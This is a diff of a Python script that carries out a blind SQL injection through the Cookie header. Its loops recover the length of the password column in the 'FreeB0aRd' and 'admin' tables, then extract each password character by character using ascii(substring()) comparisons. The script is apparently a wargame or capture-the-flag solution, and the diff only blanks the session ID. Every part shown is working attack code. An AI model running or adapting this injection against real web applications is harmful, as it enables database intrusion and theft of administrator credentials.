@@ -15,7 +15,7 @@ for i in range(1,100):
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
     re.add_header(
         "Cookie",
-        "time=1515829547 and (select length(password) from FreeB0aRd)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i)
+        "time=1515829547 and (select length(password) from FreeB0aRd)={};PHPSESSID=".format(i)
     )
 
     req = urllib.request.urlopen(re)
@@ -34,7 +34,7 @@ for i in range(1,100):
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
     re.add_header(
         "Cookie",
-        "time=1515829547 and (select length(password) from admin)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i)
+        "time=1515829547 and (select length(password) from admin)={};PHPSESSID=".format(i)
     )
 
     req = urllib.request.urlopen(re)
@@ -53,7 +53,7 @@ for i in range(1, freeboard_length+1):
         re.add_header(
             "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
         re.add_header(
-            "Cookie", "time=1515829547 and (select ascii(substring(password,{},1)) from FreeB0aRd)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i,j)
+            "Cookie", "time=1515829547 and (select ascii(substring(password,{},1)) from FreeB0aRd)={};PHPSESSID=".format(i,j)
         )
 
         req = urllib.request.urlopen(re)
@@ -73,7 +73,7 @@ for i in range(1, admin_length+1):
         re.add_header(
             "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
         re.add_header(
-            "Cookie", "time=1515829547 and (select ascii(substring(password,{},1)) from admin)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i,j)
+            "Cookie", "time=1515829547 and (select ascii(substring(password,{},1)) from admin)={};PHPSESSID=".format(i,j)
         )
 
         req = urllib.request.urlopen(re)
